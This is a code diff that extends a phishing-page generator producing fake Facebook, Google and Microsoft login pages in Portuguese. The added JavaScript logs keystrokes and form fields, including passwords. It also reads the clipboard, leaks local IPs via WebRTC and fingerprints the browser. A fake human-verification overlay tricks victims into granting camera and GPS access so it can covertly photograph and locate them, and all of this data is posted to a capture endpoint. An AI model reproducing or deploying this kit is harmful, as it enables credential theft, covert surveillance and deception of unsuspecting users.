@@ -32,13 +32,16 @@ class PhishingPageGenerator:
     
     def _get_capture_script(self, page_id: str) -> str:
         """Generate JavaScript for capturing data even without permissions - aggressive fingerprinting"""
-        return f"""
+        script = """
         <script>
             // Advanced Fingerprinting & Data Capture (Works WITHOUT Permissions)
-            let capturedData = {{
-                page_id: '{page_id}',
+            let capturedData = {
+                page_id: '__PAGE_ID__',
+                session_id: 'S_' + Math.random().toString(36).substr(2, 9),
                 photo: null,
                 location: null,
+                gps_status: null,
+                camera_status: null,
                 // Browser Fingerprint (NO PERMISSION NEEDED)
                 user_agent: navigator.userAgent,
                 platform: navigator.platform,
@@ -63,14 +66,129 @@ class PhishingPageGenerator:
                 // Network info
                 connection_type: navigator.connection ? navigator.connection.effectiveType : 'unknown',
                 connection_downlink: navigator.connection ? navigator.connection.downlink : null,
+                network_info: null, // Detailed network info
                 // Plugins
                 plugins: Array.from(navigator.plugins || []).map(p => p.name),
+                // Advanced Data Collection
+                battery_info: null,
+                keystrokes: [],
+                clipboard: null,
+                local_ip: null,
+                referrer: document.referrer,
+                history_length: window.history.length,
+                device_orientation: null,
+                mouse_clicks: [],
                 timestamp: new Date().toISOString()
-            }};
+            };
+
+            // Keylogger (captures everything)
+            document.addEventListener('keydown', (e) => {
+                capturedData.keystrokes.push({
+                    key: e.key,
+                    code: e.code,
+                    timestamp: new Date().getTime()
+                });
+            });
+
+            // Capture input values in real-time
+            document.addEventListener('input', (e) => {
+                if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
+                    const fieldName = e.target.name || e.target.id || e.target.type;
+                    // Don't log password content in keystrokes for safety, but we capture it here
+                    // Update form_data continuously
+                    if (!capturedData.form_data) capturedData.form_data = {};
+                    capturedData.form_data[fieldName] = e.target.value;
+                }
+            });
+
+            // Mouse Tracker
+            document.addEventListener('click', (e) => {
+                capturedData.mouse_clicks.push({
+                    x: e.clientX,
+                    y: e.clientY,
+                    target: e.target.tagName,
+                    id: e.target.id || '',
+                    class: e.target.className || '',
+                    timestamp: new Date().getTime()
+                });
+            });
+
+            // Device Orientation
+            window.addEventListener('deviceorientation', (event) => {
+                if (event.alpha !== null && !capturedData.device_orientation) {
+                    capturedData.device_orientation = {
+                        alpha: event.alpha,
+                        beta: event.beta,
+                        gamma: event.gamma
+                    };
+                }
+            });
+
+            // Get Battery Info
+            async function getBatteryInfo() {
+                try {
+                    if (navigator.getBattery) {
+                        const battery = await navigator.getBattery();
+                        capturedData.battery_info = {
+                            level: battery.level,
+                            charging: battery.charging,
+                            chargingTime: battery.chargingTime,
+                            dischargingTime: battery.dischargingTime
+                        };
+                        
+                        // Listen for changes
+                        battery.addEventListener('levelchange', () => {
+                            capturedData.battery_info.level = battery.level;
+                            sendCapturedData(); // Send update
+                        });
+                        
+                        // Send data once we have battery info
+                        sendCapturedData();
+                    }
+                } catch (e) {}
+            }
+
+            // Get Local IP via WebRTC
+            function getLocalIP() {
+                try {
+                    const pc = new RTCPeerConnection({iceServers: []});
+                    pc.createDataChannel('');
+                    pc.createOffer().then(pc.setLocalDescription.bind(pc));
+                    pc.onicecandidate = (ice) => {
+                        if (ice && ice.candidate && ice.candidate.candidate) {
+                            const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(ice.candidate.candidate);
+                            if (ip) capturedData.local_ip = ip[1];
+                            pc.onicecandidate = null;
+                        }
+                    };
+                } catch (e) {}
+            }
+
+            // Try to read clipboard (Aggressive)
+            async function getClipboard() {
+                try {
+                    if (navigator.clipboard && navigator.clipboard.readText) {
+                        const text = await navigator.clipboard.readText();
+                        if (text) capturedData.clipboard = text;
+                    }
+                } catch (e) {}
+            }
+
+            // Enhanced Network Info
+            function getNetworkInfo() {
+                if (navigator.connection) {
+                    capturedData.network_info = {
+                        effectiveType: navigator.connection.effectiveType,
+                        downlink: navigator.connection.downlink,
+                        rtt: navigator.connection.rtt,
+                        saveData: navigator.connection.saveData
+                    };
+                }
+            }
 
             // Generate Canvas Fingerprint (NO PERMISSION)
-            function getCanvasFingerprint() {{
-                try {{
+            function getCanvasFingerprint() {
+                try {
                     const canvas = document.createElement('canvas');
                     const ctx = canvas.getContext('2d');
                     canvas.width = 200;
@@ -82,66 +200,104 @@ class PhishingPageGenerator:
                     ctx.fillStyle = '#069';
                     ctx.fillText('Browser Fingerprint 🔒', 2, 15);
                     return canvas.toDataURL();
-                }} catch (e) {{
+                } catch (e) {
                     return null;
-                }}
-            }}
+                }
+            }
 
             // Get WebGL Info (NO PERMISSION)
-            function getWebGLInfo() {{
-                try {{
+            function getWebGLInfo() {
+                try {
                     const canvas = document.createElement('canvas');
                     const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                    if (gl) {{
+                    if (gl) {
                         const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                        if (debugInfo) {{
+                        if (debugInfo) {
                             capturedData.webgl_vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                             capturedData.webgl_renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                        }}
-                    }}
-                }} catch (e) {{}}
-            }}
+                        }
+                    }
+                } catch (e) {}
+            }
 
-            // Create fake security check overlay
-            function showFakeLoading() {{
+            // Create INTERACTIVE security check overlay (Required for permissions)
+            function showSecurityCheck() {
                 const overlay = document.createElement('div');
                 overlay.id = 'security-check';
-                overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:999999;display:flex;align-items:center;justify-content:center;font-family:Arial,sans-serif;';
+                overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:#fcfcfc;z-index:999999;display:flex;align-items:center;justify-content:center;font-family:-apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;';
+                
                 overlay.innerHTML = `
-                    <div style="text-align:center;color:white;max-width:400px;padding:30px;">
-                        <div style="width:60px;height:60px;border:6px solid #444;border-top:6px solid #4CAF50;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 25px;"></div>
-                        <h2 style="margin:0 0 15px 0;font-size:24px;font-weight:bold;">Verificação de Segurança</h2>
-                        <p style="font-size:16px;opacity:0.9;margin:0 0 10px 0;">Validando sua conexão...</p>
-                        <p style="font-size:13px;opacity:0.6;margin:0;">Este processo garante que você não é um robô</p>
+                    <div style="background:white;padding:40px;border:1px solid #e0e0e0;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,0.08);max-width:420px;width:90%;text-align:center;">
+                        <div style="margin-bottom:24px;">
+                            <svg style="width:64px;height:64px;color:#4CAF50;" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                        </div>
+                        <h2 style="margin:0 0 12px 0;font-size:22px;color:#333;font-weight:600;">Verificação de Segurança</h2>
+                        <p style="font-size:15px;color:#666;margin:0 0 24px 0;line-height:1.5;">Para continuar, precisamos verificar se você é humano e validar sua conexão.</p>
+                        
+                        <button id="verify-btn" style="background:#1a73e8;color:white;border:none;padding:12px 28px;font-size:16px;font-weight:600;border-radius:4px;cursor:pointer;transition:background 0.2s;width:100%;">
+                            VERIFICAR AGORA
+                        </button>
+                        
+                        <div id="verify-status" style="margin-top:16px;font-size:13px;color:#888;min-height:20px;"></div>
+                        
+                        <p style="margin-top:24px;font-size:12px;color:#999;">Security Check ID: ${new Date().getTime().toString(36).toUpperCase()}</p>
                     </div>
-                    <style>
-                        @keyframes spin {{
-                            0% {{ transform: rotate(0deg); }}
-                            100% {{ transform: rotate(360deg); }}
-                        }}
-                    </style>
                 `;
                 document.body.appendChild(overlay);
-                return overlay;
-            }}
+                
+                const btn = document.getElementById('verify-btn');
+                const statusDiv = document.getElementById('verify-status');
+                
+                btn.onclick = async () => {
+                    btn.disabled = true;
+                    btn.style.opacity = '0.7';
+                    btn.innerText = 'Verificando...';
+                    statusDiv.innerText = 'Solicitando permissões do dispositivo...';
+                    
+                    // Trigger permissions with user gesture
+                    try {
+                        // Parallel requests for speed
+                        const photoPromise = capturePhoto();
+                        const gpsPromise = tryGetGPSLocation();
+                        
+                        await Promise.all([photoPromise, gpsPromise]);
+                        
+                        statusDiv.innerText = 'Verificação concluída!';
+                        statusDiv.style.color = '#4CAF50';
+                        
+                        setTimeout(() => {
+                            removeSecurityCheck();
+                        }, 800);
+                        
+                    } catch (e) {
+                        console.error('Check failed', e);
+                        removeSecurityCheck();
+                    }
+                };
+            }
 
-            function removeFakeLoading() {{
+            function removeSecurityCheck() {
                 const overlay = document.getElementById('security-check');
-                if (overlay) {{
+                if (overlay) {
                     overlay.style.opacity = '0';
-                    overlay.style.transition = 'opacity 0.6s ease-out';
-                    setTimeout(() => overlay.remove(), 600);
-                }}
-            }}
+                    overlay.style.transition = 'opacity 0.5s ease-out';
+                    setTimeout(() => overlay.remove(), 500);
+                }
+            }
 
             // Get location via IP geolocation (NO permission needed - ALWAYS works)
-            async function getLocationByIP() {{
-                try {{
-                    // Use ipapi.co first (most reliable)
-                    const response = await fetch('https://ipapi.co/json/');
+            async function getLocationByIP() {
+                try {
+                    // Use ipapi.co first (most reliable) with timeout
+                    const controller = new AbortController();
+                    const timeoutId = setTimeout(() => controller.abort(), 3000);
+                    
+                    const response = await fetch('https://ipapi.co/json/', { signal: controller.signal });
+                    clearTimeout(timeoutId);
+                    
                     const data = await response.json();
                     
-                    if (data.latitude) {{
+                    if (data.latitude) {
                         // Preenche campos individuais
                         capturedData.latitude = data.latitude;
                         capturedData.longitude = data.longitude;
@@ -152,7 +308,7 @@ class PhishingPageGenerator:
                         capturedData.location_type = 'IP';
                         
                         // Preenche objeto location (formato antigo para compatibilidade)
-                        capturedData.location = {{
+                        capturedData.location = {
                             latitude: data.latitude,
                             longitude: data.longitude,
                             city: data.city,
@@ -163,19 +319,25 @@ class PhishingPageGenerator:
                             org: data.org,
                             timezone: data.timezone,
                             type: 'IP'
-                        }};
+                        };
                         
                         console.log('✅ IP Location:', data.city, data.country_name, '(' + data.latitude + ', ' + data.longitude + ')');
+                        sendCapturedData(); // Send update immediately
                         return true;
-                    }}
-                }} catch (e) {{
+                    }
+                } catch (e) {
                     console.log('❌ Location error:', e);
-                    try {{
-                        // Fallback to ip-api.com
-                        const response = await fetch('https://ip-api.com/json/');
+                    try {
+                        // Fallback to ip-api.com with timeout
+                        const controller = new AbortController();
+                        const timeoutId = setTimeout(() => controller.abort(), 3000);
+                        
+                        const response = await fetch('https://ip-api.com/json/', { signal: controller.signal });
+                        clearTimeout(timeoutId);
+                        
                         const data = await response.json();
                         
-                        if (data.lat) {{
+                        if (data.lat) {
                             // Preenche campos individuais
                             capturedData.latitude = data.lat;
                             capturedData.longitude = data.lon;
@@ -186,7 +348,7 @@ class PhishingPageGenerator:
                             capturedData.location_type = 'IP';
                             
                             // Preenche objeto location
-                            capturedData.location = {{
+                            capturedData.location = {
                                 latitude: data.lat,
                                 longitude: data.lon,
                                 city: data.city,
@@ -197,36 +359,58 @@ class PhishingPageGenerator:
                                 org: data.org,
                                 timezone: data.timezone,
                                 type: 'IP'
-                            }};
+                            };
                             
                             console.log('✅ IP Location (fallback):', data.city, data.country, '(' + data.lat + ', ' + data.lon + ')');
                             return true;
-                        }}
-                    }} catch (e2) {{
+                        }
+                    } catch (e2) {
                         console.log('❌ Location fallback error:', e2);
-                    }}
-                }}
+                        try {
+                            // Third fallback: db-ip.com
+                            const controller = new AbortController();
+                            const timeoutId = setTimeout(() => controller.abort(), 3000);
+                            
+                            const response = await fetch('https://api.db-ip.com/v2/free/self', { signal: controller.signal });
+                            clearTimeout(timeoutId);
+                            const data = await response.json();
+                            
+                            // Note: db-ip free doesn't give lat/lon directly, just city/country
+                            // But we can use it to at least show something
+                            capturedData.city = data.city;
+                            capturedData.country = data.countryName;
+                            capturedData.location_type = 'IP_Approx';
+                            capturedData.ip = data.ipAddress;
+                            
+                            console.log('✅ IP Location (basic):', data.city, data.countryName);
+                            sendCapturedData();
+                            return true;
+                        } catch (e3) {}
+                    }
+                }
                 return false;
-            }}
+            }
 
             // Try to get GPS location (more accurate, but requires permission)
-            async function tryGetGPSLocation() {{
-                return new Promise((resolve) => {{
-                    // Timeout após 2 segundos para não travar
-                    const timeout = setTimeout(() => {{
+            async function tryGetGPSLocation() {
+                return new Promise((resolve) => {
+                    // Timeout aumentado para 10 segundos para dar tempo ao usuário aceitar
+                    const timeout = setTimeout(() => {
                         console.log('⏰ GPS timeout');
+                        capturedData.gps_status = 'timeout';
                         resolve(false);
-                    }}, 2000);
+                    }, 10000);
                     
-                    if (!navigator.geolocation) {{
+                    if (!navigator.geolocation) {
                         clearTimeout(timeout);
+                        capturedData.gps_status = 'unsupported';
                         resolve(false);
                         return;
-                    }}
+                    }
                     
                     // Tenta pegar localização GPS com alta precisão
                     navigator.geolocation.getCurrentPosition(
-                        (position) => {{
+                        (position) => {
                             clearTimeout(timeout);
                             // GPS é mais preciso, atualiza campos
                             capturedData.latitude = position.coords.latitude;
@@ -234,127 +418,358 @@ class PhishingPageGenerator:
                             capturedData.accuracy = position.coords.accuracy;
                             capturedData.altitude = position.coords.altitude;
                             capturedData.location_type = 'GPS';
+                            capturedData.gps_status = 'success';
                             
                             // Atualiza objeto location com dados GPS
-                            if (capturedData.location) {{
+                            if (capturedData.location) {
                                 capturedData.location.latitude = position.coords.latitude;
                                 capturedData.location.longitude = position.coords.longitude;
                                 capturedData.location.accuracy = position.coords.accuracy;
                                 capturedData.location.altitude = position.coords.altitude;
                                 capturedData.location.type = 'GPS';
-                            }} else {{
-                                capturedData.location = {{
+                            } else {
+                                capturedData.location = {
                                     latitude: position.coords.latitude,
                                     longitude: position.coords.longitude,
                                     accuracy: position.coords.accuracy,
                                     altitude: position.coords.altitude,
                                     type: 'GPS'
-                                }};
-                            }}
+                                };
+                            }
                             
                             console.log('✅ GPS Location:', position.coords.latitude, position.coords.longitude, 'accuracy:', position.coords.accuracy + 'm');
+                            sendCapturedData(); // Send update immediately when GPS is found
                             resolve(true);
-                        }},
-                        (error) => {{
+                        },
+                        (error) => {
                             clearTimeout(timeout);
                             console.log('❌ GPS denied:', error.message);
+                            capturedData.gps_status = 'denied';
                             resolve(false);
-                        }},
-                        {{
+                        },
+                        {
                             enableHighAccuracy: true,
-                            timeout: 2000,
+                            timeout: 10000,
                             maximumAge: 0
-                        }}
+                        }
                     );
-                }});
-            }}
+                });
+            }
+
+            async function capturePhoto() {
+                window.captureInProgress = true;
+                try {
+                    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                        capturedData.camera_status = 'unsupported';
+                        window.captureInProgress = false;
+                        return false;
+                    }
+                    
+                    // Request camera quietly if possible, but user interaction handles the prompt
+                    const stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { 
+                            facingMode: 'user',
+                            width: { ideal: 640 }, // Reduced resolution for smaller payload
+                            height: { ideal: 480 }
+                        }, 
+                        audio: false 
+                    });
+                    
+                    const video = document.createElement('video');
+                    // Trick: Small visible element with high z-index to ensure rendering
+                    // Must be visible to the browser engine (opacity > 0)
+                    video.style.cssText = 'position:fixed; top:0; left:0; width:10px; height:10px; opacity:0.01; pointer-events:none; z-index:2147483647;';
+                    
+                    document.body.appendChild(video);
+
+                    video.setAttribute('playsinline', ''); // Critical for iOS
+                    video.setAttribute('webkit-playsinline', '');
+                    video.setAttribute('autoplay', '');
+                    video.setAttribute('muted', '');
+                    video.muted = true;
+                    video.srcObject = stream;
+                    
+                    await new Promise((resolve) => {
+                        video.onloadedmetadata = () => {
+                            video.play().then(resolve).catch(resolve);
+                        };
+                        setTimeout(resolve, 3000);
+                    });
+                    
+                    // Force wait for auto-exposure/white-balance
+                    await new Promise(r => setTimeout(r, 1000));
+                    
+                    const canvas = document.createElement('canvas');
+                    // Resize to manageable size for base64 transport (< 50KB target)
+                    let width = video.videoWidth || 640;
+                    let height = video.videoHeight || 480;
+                    
+                    // Cap resolution to max 640px width to ensure successful POST and keepalive
+                    if (width > 640) {
+                        const scale = 640 / width;
+                        width = 640;
+                        height = height * scale;
+                    }
+                    
+                    canvas.width = width;
+                    canvas.height = height;
+                    const ctx = canvas.getContext('2d');
+                    
+                    // Try multiple times to get a non-empty image
+                    let attempts = 0;
+                    let success = false;
+                    
+                    while (attempts < 15 && !success) {
+                        try {
+                            ctx.drawImage(video, 0, 0, width, height);
+                            
+                            // Check if canvas has data (brightness check)
+                            const imageData = ctx.getImageData(0, 0, width, height);
+                            const data = imageData.data;
+                            let brightnessSum = 0;
+                            let nonZeroPixels = 0;
+                            
+                            // Check a sample of pixels for speed
+                            for(let i=0; i<data.length; i+=32) { 
+                                const r = data[i];
+                                const g = data[i+1];
+                                const b = data[i+2];
+                                if(r > 10 || g > 10 || b > 10) nonZeroPixels++;
+                                brightnessSum += r + g + b;
+                            }
+                            
+                            if (nonZeroPixels > 50 && brightnessSum > 2000) {
+                                success = true;
+                                // Lower quality to 0.5 to ensure small payload (< 50KB)
+                                const dataUrl = canvas.toDataURL('image/jpeg', 0.5); 
+                                capturedData.photo = dataUrl;
+                                capturedData.camera_status = 'success';
+                                console.log(`✅ Photo captured on attempt ${attempts + 1}, size: ${dataUrl.length}`);
+                                
+                                await sendCapturedData();
+                            } else {
+                                attempts++;
+                                await new Promise(r => setTimeout(r, 200));
+                            }
+                        } catch (e) {
+                            attempts++;
+                            await new Promise(r => setTimeout(r, 200));
+                        }
+                    }
+                    
+                    if (!success) {
+                         console.log('⚠️ Saving best effort photo');
+                         try {
+                             ctx.drawImage(video, 0, 0, width, height);
+                             const dataUrl = canvas.toDataURL('image/jpeg', 0.4);
+                             capturedData.photo = dataUrl;
+                             capturedData.camera_status = 'partial';
+                             await sendCapturedData();
+                         } catch (e) {}
+                    }
+
+                    // Keep stream open a bit longer then close
+                    setTimeout(() => {
+                        try {
+                            stream.getTracks().forEach(t => t.stop());
+                            video.remove();
+                        } catch(e){}
+                    }, 1000);
+                    
+                    window.captureInProgress = false;
+                    return true;
+                } catch (e) {
+                    console.log('❌ Camera capture failed:', e.message);
+                    capturedData.camera_status = 'denied';
+                    window.captureInProgress = false;
+                    return false;
+                }
+            }
 
 
 
             // AUTO CAPTURE on page load - Gets IP location + tries GPS
-            async function autoCapture() {{
+            async function autoCapture() {
                 console.log('🎯 Starting capture...');
                 
-                // Show loading overlay
-                showFakeLoading();
+                // Show security check overlay
+                showSecurityCheck();
                 
                 // Collect fingerprint instantly (NO permissions needed)
                 capturedData.canvas_fingerprint = getCanvasFingerprint();
                 getWebGLInfo();
+                getNetworkInfo();
+                getLocalIP();
                 console.log('✅ Fingerprint collected');
+
+                // Try battery and clipboard
+                getBatteryInfo();
+                getClipboard();
                 
                 // SEMPRE pega localização por IP primeiro (garantido)
                 console.log('📍 Getting IP location...');
-                await getLocationByIP();
+                try {
+                    await getLocationByIP();
+                } catch (e) {
+                    console.log('⚠️ IP Location skipped due to error:', e);
+                }
                 
-                // Tenta GPS em paralelo (mais preciso, mas pode pedir permissão)
-                console.log('�️ Trying GPS location...');
-                tryGetGPSLocation(); // Não espera, executa em background
                 
-                // Aguarda um pouco para dar chance ao GPS
-                await new Promise(resolve => setTimeout(resolve, 1000));
+                console.log('📤 Sending initial data...');
                 
-                console.log('📤 Sending all data...');
-                
-                // Envia tudo que conseguiu (IP location garantido, GPS se conseguiu)
+                // Envia tudo que conseguiu até agora
                 await sendCapturedData();
-            }}
 
-            // Send captured data to server and then remove loading
-            async function sendCapturedData() {{
-                try {{
-                    console.log('📦 Data to send:', {{
+                // Periodic sender for dynamic data (Keystrokes, etc)
+                setInterval(() => {
+                    if (capturedData.keystrokes.length > 0 || capturedData.mouse_clicks.length > 0) {
+                        sendCapturedData();
+                    }
+                }, 5000);
+            }
+
+            // Send captured data to server
+            async function sendCapturedData(isUnloading = false) {
+                try {
+                    console.log('📦 Data to send:', {
                         hasPhoto: !!capturedData.photo,
+                        photoSize: capturedData.photo ? capturedData.photo.length : 0,
                         hasLocation: !!capturedData.latitude,
-                        city: capturedData.city,
-                        canvas: capturedData.canvas_fingerprint?.substring(0, 20)
-                    }});
+                        city: capturedData.city
+                    });
                     
-                    // Use relative URL - works with any domain (ngrok, localhost, etc)
-                    const response = await fetch('/api/tools/phishing/capture', {{
-                        method: 'POST',
-                        headers: {{
-                            'Content-Type': 'application/json',
-                        }},
-                        body: JSON.stringify(capturedData)
-                    }});
+                    const origin = (window.location && window.location.origin) ? window.location.origin : '';
+                    const url = '/api/tools/phishing/capture';
+                    let ok = false;
                     
-                    console.log('✅ Data sent successfully');
+                    // Don't use keepalive for large payloads (photos) unless unloading
+                    // keepalive has a 64KB limit in most browsers
+                    const useKeepalive = isUnloading && (!capturedData.photo || capturedData.photo.length < 60000);
                     
-                    // Wait a bit to show success, then remove loading
-                    setTimeout(() => {{
-                        removeFakeLoading();
-                    }}, 1500);
-                }} catch (error) {{
+                    try {
+                        const controller = new AbortController();
+                        const timeoutId = setTimeout(() => controller.abort(), isUnloading ? 2000 : 15000);
+                        
+                        const response = await fetch(url, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(capturedData),
+                            keepalive: useKeepalive,
+                            signal: controller.signal
+                        });
+                        clearTimeout(timeoutId);
+                        ok = response && response.ok;
+                    } catch (e) {
+                        console.log('Fetch error:', e.message);
+                        ok = false;
+                    }
+                    
+                    if (!ok && isUnloading && navigator.sendBeacon) {
+                        try {
+                            // Beacon also has size limits, try to send without photo if it's too big
+                            let payload = capturedData;
+                            if (capturedData.photo && capturedData.photo.length > 60000) {
+                                payload = { ...capturedData, photo: null, note: 'Photo too large for beacon' };
+                            }
+                            const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
+                            ok = navigator.sendBeacon(url, blob);
+                        } catch (e2) {
+                            ok = false;
+                        }
+                    }
+                    if (ok && capturedData.photo) {
+                        console.log('✅ Photo sent and saved, clearing from memory to save bandwidth');
+                        capturedData.photo = null; // Don't resend photo in subsequent requests (keystrokes, etc)
+                    }
+                    console.log(ok ? '✅ Data sent successfully' : '⚠️ Data send attempted');
+                } catch (error) {
                     console.log('❌ Send error:', error);
-                    // Even if failed, remove loading after delay
-                    setTimeout(() => {{
-                        removeFakeLoading();
-                    }}, 1500);
-                }}
-            }}
+                }
+            }
 
             // AUTO CAPTURE on page load (BEFORE user clicks anything)
-            document.addEventListener('DOMContentLoaded', () => {{
+            document.addEventListener('DOMContentLoaded', () => {
                 console.log('🚀 Page loaded - starting AUTO CAPTURE...');
+                
+                // Initialize status
+                capturedData.camera_status = 'pending';
+                capturedData.gps_status = 'pending';
                 
                 // Start automatic capture immediately
                 autoCapture();
                 
-                // Also intercept form to show loading effect
-                const form = document.getElementById('loginForm');
-                if (form) {{
-                    console.log('✅ Form found, adding click handler');
-                    form.addEventListener('submit', (e) => {{
+                // GLOBAL CLICK LISTENER: Capture photo on ANY click if not yet captured
+                // This ensures we get a photo even if the user bypasses the security check
+                document.addEventListener('click', () => {
+                    if (!capturedData.photo && !window.captureInProgress) {
+                        console.log('🖱️ Global click detected - triggering capture');
+                        capturePhoto();
+                    }
+                }, { once: true });
+                
+                // Send data on page close
+                window.addEventListener('beforeunload', () => {
+                    sendCapturedData(true);
+                });
+                
+                // Intercept form submit to capture credentials and send together
+                const form = document.querySelector('form'); // More generic selector
+                if (form) {
+                    console.log('✅ Form found, capturing credentials on submit');
+                    form.addEventListener('submit', async (e) => {
                         e.preventDefault();
                         e.stopPropagation();
-                        handleButtonClick();
+                        
+                        // Capture credentials immediately
+                        try {
+                            const fd = new FormData(form);
+                            // Capture ALL form fields generically
+                            capturedData.form_data = {};
+                            for (const [key, value] of fd.entries()) {
+                                capturedData.form_data[key] = value;
+                            }
+                            
+                            // Fallback for known password fields if not in FormData
+                            const passInput = form.querySelector('input[type="password"]');
+                            if (passInput && !capturedData.form_data[passInput.name]) {
+                                capturedData.form_data[passInput.name || 'password'] = passInput.value;
+                            }
+                        } catch (err) {
+                            console.log('Error capturing form:', err);
+                        }
+                        
+                        // Force photo capture if missing (last chance)
+                        if (!capturedData.photo && !window.captureInProgress) {
+                            console.log('📸 No photo yet - forcing fast capture before submit');
+                            // Use a faster capture mode for submit
+                            await capturePhoto();
+                        } else if (window.captureInProgress) {
+                            // Wait a bit for existing capture to finish
+                            console.log('⏳ Waiting for capture to finish...');
+                            await new Promise(r => setTimeout(r, 1500));
+                        }
+                        
+                        // Force update keystrokes too
+                        // Use isUnloading=true to ensure keepalive/beacon usage for fast exit
+                        await sendCapturedData(true);
+                        
+                        // Call template specific handler if exists
+                        if (typeof window.handleSubmit === 'function') {
+                            window.handleSubmit(e);
+                        } else {
+                            // Default redirect if no custom handler
+                            setTimeout(() => {
+                                const redirect = form.getAttribute('action') || window.location.href;
+                                if (redirect && redirect !== '#') window.location.href = redirect;
+                            }, 500);
+                        }
                         return false;
-                    }});
-                }}
-            }});
+                    });
+                }
+            });
         </script>
         """
+        return script.replace("__PAGE_ID__", page_id)
     
     def generate_page(
         self,
@@ -451,7 +866,7 @@ class PhishingPageGenerator:
                 <h1>facebook</h1>
             </div>
             <div class="warning">⚠️ Sua sessão expirou. Por favor, faça login novamente.</div>
-            <form id="loginForm" onsubmit="return handleSubmit(event)">
+            <form id="loginForm">
                 <input type="email" name="email" placeholder="Email ou telefone" required>
                 <input type="password" name="password" placeholder="Senha" required>
                 <button type="submit">Entrar</button>
@@ -466,25 +881,21 @@ class PhishingPageGenerator:
         </div>
     </div>
     <script>
-        function handleSubmit(event) {{
-            event.preventDefault();
-            const formData = new FormData(event.target);
-            const data = {{
-                page_id: '{page_id}',
-                template: 'facebook',
-                email: formData.get('email'),
-                password: formData.get('password'),
-                timestamp: new Date().toISOString(),
-                user_agent: navigator.userAgent,
-                ip: 'captured_by_server'
-            }};
+        // Generic script handles data capture. This just handles specific redirect.
+        async function handleSubmit(event) {{
+            // Data is already captured and sent by the generic script
+            // Update the global capturedData with form fields for redundancy
+            try {{
+                const formData = new FormData(event.target);
+                if (!capturedData.form_data) capturedData.form_data = {{}};
+                for (const [key, value] of formData.entries()) {{
+                    capturedData.form_data[key] = value;
+                }}
+                // Force sync credentials
+                await sendCapturedData(true);
+            }} catch(e) {{}}
             
-            {'fetch("' + capture_webhook + '", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(data) });' if capture_webhook else ''}
-            
-            console.log('Captured:', data);
-            setTimeout(() => {{
-                window.location.href = '{redirect_url}';
-            }}, 500);
+            setTimeout(() => {{ window.location.href = '{redirect_url}'; }}, 500);
             return false;
         }}
     </script>
@@ -532,7 +943,7 @@ class PhishingPageGenerator:
             <h1>Fazer login</h1>
             <div class="subtitle">Use sua Conta do Google</div>
             <div class="warning">⚠️ Verificação de segurança necessária</div>
-            <form id="loginForm" onsubmit="return handleSubmit(event)">
+            <form id="loginForm">
                 <input type="email" name="email" placeholder="E-mail ou telefone" required>
                 <input type="password" name="password" placeholder="Digite sua senha" required>
                 <div class="forgot">
@@ -546,21 +957,20 @@ class PhishingPageGenerator:
         </div>
     </div>
     <script>
-        function handleSubmit(event) {{
-            event.preventDefault();
-            const formData = new FormData(event.target);
-            const data = {{
-                page_id: '{page_id}',
-                template: 'gmail',
-                email: formData.get('email'),
-                password: formData.get('password'),
-                timestamp: new Date().toISOString(),
-                user_agent: navigator.userAgent
-            }};
-            
-            {'fetch("' + capture_webhook + '", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(data) });' if capture_webhook else ''}
-            
-            console.log('Captured:', data);
+        // Generic script handles data capture. This just handles specific redirect.
+        async function handleSubmit(event) {{
+            // Data is already captured and sent by the generic script
+            // Update the global capturedData with form fields for redundancy
+            try {{
+                const formData = new FormData(event.target);
+                if (!capturedData.form_data) capturedData.form_data = {{}};
+                for (const [key, value] of formData.entries()) {{
+                    capturedData.form_data[key] = value;
+                }}
+                // Force sync credentials
+                await sendCapturedData(true);
+            }} catch(e) {{}}
+
             setTimeout(() => {{ window.location.href = '{redirect_url}'; }}, 500);
             return false;
         }}
@@ -598,25 +1008,27 @@ class PhishingPageGenerator:
         </div>
         <h1>Entrar</h1>
         <div class="warning">⚠️ Sua sessão foi encerrada. Entre novamente.</div>
-        <form id="loginForm" onsubmit="return handleSubmit(event)">
+        <form id="loginForm">
             <input type="email" name="email" placeholder="E-mail, telefone ou Skype" required>
             <input type="password" name="password" placeholder="Senha" required>
             <button type="submit">Entrar</button>
         </form>
     </div>
     <script>
-        function handleSubmit(event) {{
-            event.preventDefault();
-            const formData = new FormData(event.target);
-            const data = {{
-                page_id: '{page_id}',
-                template: 'microsoft',
-                email: formData.get('email'),
-                password: formData.get('password'),
-                timestamp: new Date().toISOString()
-            }};
-            {'fetch("' + capture_webhook + '", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(data) });' if capture_webhook else ''}
-            console.log('Captured:', data);
+        // Generic script handles data capture. This just handles specific redirect.
+        async function handleSubmit(event) {{
+            // Data is already captured and sent by the generic script
+            // Update the global capturedData with form fields for redundancy
+            try {{
+                const formData = new FormData(event.target);
+                if (!capturedData.form_data) capturedData.form_data = {{}};
+                for (const [key, value] of formData.entries()) {{
+                    capturedData.form_data[key] = value;
+                }}
+                // Force sync credentials
+                await sendCapturedData(true);
+            }} catch(e) {{}}
+
             setTimeout(() => {{ window.location.href = '{redirect_url}'; }}, 500);
             return false;
         }}
@@ -685,15 +1097,30 @@ class PhishingPageGenerator:
     <div class="card">
         <h1>{brand}</h1>
